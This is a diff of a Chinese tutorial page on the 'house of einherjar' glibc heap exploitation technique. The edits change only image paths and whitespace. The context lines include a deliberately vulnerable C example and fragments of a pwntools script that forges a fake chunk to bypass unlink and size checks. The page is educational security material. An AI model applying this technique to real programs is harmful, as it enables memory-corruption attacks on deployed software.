@@ -28,7 +28,7 @@ house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。�
 
 这里借用原作者的一张图片说明
 
-![](/pwn/heap/figure/backward_consolidate.png)
+![](./figure/backward_consolidate.png)
 
 关于整体的操作，请参考 `深入理解堆的实现` 那一章节。
 
@@ -48,13 +48,13 @@ house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。�
 
 假设溢出前的状态如下
 
-![](/pwn/heap/figure/einherjar_before_overflow.png)
+![](./figure/einherjar_before_overflow.png)
 
 #### 溢出
 
 这里我们假设 p0 堆块一方面可以写prev_size字段，另一方面，存在off by one的漏洞，可以写下一个 chunk 的PREV_INUSE 部分，那么
 
-![](/pwn/heap/figure/einherjar_overflowing.png)
+![](./figure/einherjar_overflowing.png)
 
 #### 溢出后
 
@@ -62,7 +62,7 @@ house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。�
 
 当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了fake chunk 以便于绕过 unlink 的检测。
 
-![](/pwn/heap/figure/einherjar_after_overflow.png)
+![](./figure/einherjar_after_overflow.png)
 
 ### 攻击过程示例
 
@@ -72,13 +72,13 @@ house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。�
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
- 
+
 int main(void){
     char* s0 = malloc(0x200);　//构造fake chunk
-    char* s1 = malloc(0x18); 
+    char* s1 = malloc(0x18);
     char* s2 = malloc(0xf0);　
     char* s3 = malloc(0x20); //为了不让s2与top chunk 合并
-    printf("begin\n"); 
+    printf("begin\n");
     printf("%p\n", s0);
     printf("input s0\n");
     read(0, s0, 0x200); //读入fake chunk
@@ -93,7 +93,7 @@ int main(void){
 
 ```python
 from pwn import *
- 
+
 p = process("./example")
 context.log_level = 'debug'
 #gdb.attach(p)
@@ -104,7 +104,7 @@ payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
 '''
 p64(address) * 2是为了绕过
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
-  malloc_printerr ("corrupted double-linked list");  
+  malloc_printerr ("corrupted double-linked list");
 '''
 payload += p64(0x100) #fake size
 p.sendline(payload)
@@ -147,7 +147,7 @@ payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
 
 ```c
 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
-      malloc_printerr ("corrupted size vs. prev_size");     
+      malloc_printerr ("corrupted size vs. prev_size");
 ```
 
 所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。
